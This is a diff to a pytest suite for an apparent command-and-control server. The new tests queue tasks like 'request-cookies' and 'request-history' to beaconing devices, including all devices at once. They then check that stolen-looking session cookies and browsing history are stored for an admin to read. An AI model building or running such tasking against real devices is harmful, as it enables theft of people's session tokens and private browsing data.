@@ -19,9 +19,11 @@ from server import app, handler
 def reset_handler():
     """Reset the server handler state before each test."""
     handler.devices.clear()
+    handler.task_queues.clear()
+    handler.task_registry.clear()
     handler._seed_sample_devices()
-    handler.server_config.beacon_interval = 2
-    handler.server_config.communication_protocol = "https"
+    handler.server_config.beacon_interval = 15
+    handler.server_config.communication_protocol = "http"
 
 
 @pytest.fixture
@@ -127,17 +129,17 @@ class TestAdminSetBeaconInterval:
     @pytest.mark.asyncio
     async def test_set_valid_interval(self, client: AsyncClient) -> None:
         resp = await client.post(
-            "/admin/beacon-interval", json={"interval": 16}
+            "/admin/beacon-interval", json={"interval": 30}
         )
         assert resp.status_code == 200
         data = resp.json()
         assert data["status"] == "success"
-        assert data["data"]["beacon_interval"] == 16
-        assert handler.server_config.beacon_interval == 16
+        assert data["data"]["beacon_interval"] == 30
+        assert handler.server_config.beacon_interval == 30
 
     @pytest.mark.asyncio
     async def test_all_valid_intervals(self, client: AsyncClient) -> None:
-        for val in [2, 4, 8, 16, 32]:
+        for val in [15, 30, 60, 120]:
             resp = await client.post(
                 "/admin/beacon-interval", json={"interval": val}
             )
@@ -325,6 +327,28 @@ class TestBeaconResult:
         assert resp.json()["status"] == "accepted"
 
     @pytest.mark.asyncio
+    async def test_submit_result_stores_on_device(
+        self, client: AsyncClient
+    ) -> None:
+        # Queue a task so the registry knows the task_type.
+        queue_resp = await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+        })
+        task_id = queue_resp.json()["data"]["task_id"]
+
+        resp = await client.post("/beacon/result", json={
+            "task_id": task_id,
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+            "success": True,
+            "data": {"output": "google.com: session=abc"},
+        })
+        assert resp.status_code == 200
+        device = handler.get_device("device-alpha")
+        assert "request-cookies" in device.results  # type: ignore[union-attr]
+
+    @pytest.mark.asyncio
     async def test_submit_result_unknown_device(
         self, client: AsyncClient
     ) -> None:
@@ -351,4 +375,189 @@ class TestBeaconConfig:
         assert "beacon_interval" in data
         assert "communication_protocol" in data
         assert "valid_intervals" in data
-        assert 4 in data["valid_intervals"]
+        assert 15 in data["valid_intervals"]
+
+
+# ---------------------------------------------------------------------------
+# Admin task queue endpoints
+# ---------------------------------------------------------------------------
+
+class TestAdminQueueTask:
+    """Tests for POST /admin/queue-task."""
+
+    @pytest.mark.asyncio
+    async def test_queue_task_for_device(self, client: AsyncClient) -> None:
+        resp = await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+        })
+        assert resp.status_code == 200
+        data = resp.json()
+        assert data["status"] == "success"
+        assert data["data"]["device"] == "device-alpha"
+        assert data["data"]["task_type"] == "request-cookies"
+        assert "task_id" in data["data"]
+
+    @pytest.mark.asyncio
+    async def test_queue_task_with_parameters(
+        self, client: AsyncClient
+    ) -> None:
+        resp = await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+            "parameters": {"domains": "google.com"},
+        })
+        assert resp.status_code == 200
+
+    @pytest.mark.asyncio
+    async def test_queue_task_for_unknown_device_returns_404(
+        self, client: AsyncClient
+    ) -> None:
+        resp = await client.post("/admin/queue-task", json={
+            "device_name": "ghost-device",
+            "task_type": "request-cookies",
+        })
+        assert resp.status_code == 404
+
+    @pytest.mark.asyncio
+    async def test_queue_task_for_all_devices(
+        self, client: AsyncClient
+    ) -> None:
+        resp = await client.post("/admin/queue-task", json={
+            "device_name": "*",
+            "task_type": "request-cookies",
+        })
+        assert resp.status_code == 200
+        data = resp.json()
+        assert data["data"]["device_count"] == 3
+        assert data["data"]["tasks_queued"] == 3
+
+    @pytest.mark.asyncio
+    async def test_queued_task_appears_in_beacon_tasks(
+        self, client: AsyncClient
+    ) -> None:
+        # Queue a task
+        await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+            "parameters": {"domains": "github.com"},
+        })
+        # Beacon polls for tasks
+        resp = await client.get("/beacon/tasks/device-alpha")
+        assert resp.status_code == 200
+        data = resp.json()
+        assert len(data["tasks"]) == 1
+        assert data["tasks"][0]["task_type"] == "request-cookies"
+        assert data["tasks"][0]["parameters"] == {"domains": "github.com"}
+
+    @pytest.mark.asyncio
+    async def test_tasks_are_dequeued_after_poll(
+        self, client: AsyncClient
+    ) -> None:
+        # Queue a task
+        await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+        })
+        # First poll — gets the task
+        resp1 = await client.get("/beacon/tasks/device-alpha")
+        assert len(resp1.json()["tasks"]) == 1
+        # Second poll — queue is empty
+        resp2 = await client.get("/beacon/tasks/device-alpha")
+        assert len(resp2.json()["tasks"]) == 0
+
+    @pytest.mark.asyncio
+    async def test_tasks_do_not_leak_between_devices(
+        self, client: AsyncClient
+    ) -> None:
+        await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+        })
+        # Beta should have no tasks
+        resp = await client.get("/beacon/tasks/device-beta")
+        assert resp.json()["tasks"] == []
+
+
+class TestAdminPendingTasks:
+    """Tests for GET /admin/pending-tasks."""
+
+    @pytest.mark.asyncio
+    async def test_no_pending_tasks(self, client: AsyncClient) -> None:
+        resp = await client.get("/admin/pending-tasks")
+        assert resp.status_code == 200
+        data = resp.json()
+        assert data["data"]["pending_by_device"] == {}
+        assert "0 task(s)" in data["message"]
+
+    @pytest.mark.asyncio
+    async def test_shows_pending_per_device(
+        self, client: AsyncClient
+    ) -> None:
+        await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-cookies",
+        })
+        await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-history",
+        })
+        await client.post("/admin/queue-task", json={
+            "device_name": "device-beta",
+            "task_type": "request-bookmarks",
+        })
+        resp = await client.get("/admin/pending-tasks")
+        data = resp.json()
+        pending = data["data"]["pending_by_device"]
+        assert pending["device-alpha"] == 2
+        assert pending["device-beta"] == 1
+        assert "3 task(s)" in data["message"]
+
+
+# ---------------------------------------------------------------------------
+# Admin results endpoint
+# ---------------------------------------------------------------------------
+
+class TestAdminResults:
+    """Tests for GET /admin/results."""
+
+    @pytest.mark.asyncio
+    async def test_no_results_returns_empty(self, client: AsyncClient) -> None:
+        resp = await client.get("/admin/results")
+        assert resp.status_code == 200
+        data = resp.json()
+        assert data["status"] == "success"
+        assert data["data"]["results_by_device"] == {}
+        assert "0 result(s)" in data["message"]
+
+    @pytest.mark.asyncio
+    async def test_returns_stored_results(self, client: AsyncClient) -> None:
+        # Queue and submit a result
+        queue_resp = await client.post("/admin/queue-task", json={
+            "device_name": "device-alpha",
+            "task_type": "request-history",
+        })
+        task_id = queue_resp.json()["data"]["task_id"]
+        await client.post("/beacon/result", json={
+            "task_id": task_id,
+            "device_name": "device-alpha",
+            "task_type": "request-history",
+            "success": True,
+            "data": {"output": "https://github.com"},
+        })
+
+        resp = await client.get("/admin/results")
+        data = resp.json()
+        results = data["data"]["results_by_device"]
+        assert "device-alpha" in results
+        assert "request-history" in results["device-alpha"]
+        assert results["device-alpha"]["request-history"]["success"] is True
+
+    @pytest.mark.asyncio
+    async def test_only_devices_with_results_are_listed(
+        self, client: AsyncClient
+    ) -> None:
+        resp = await client.get("/admin/results")
+        data = resp.json()
+        # device-beta and device-gamma have no results
+        assert "device-beta" not in data["data"]["results_by_device"]
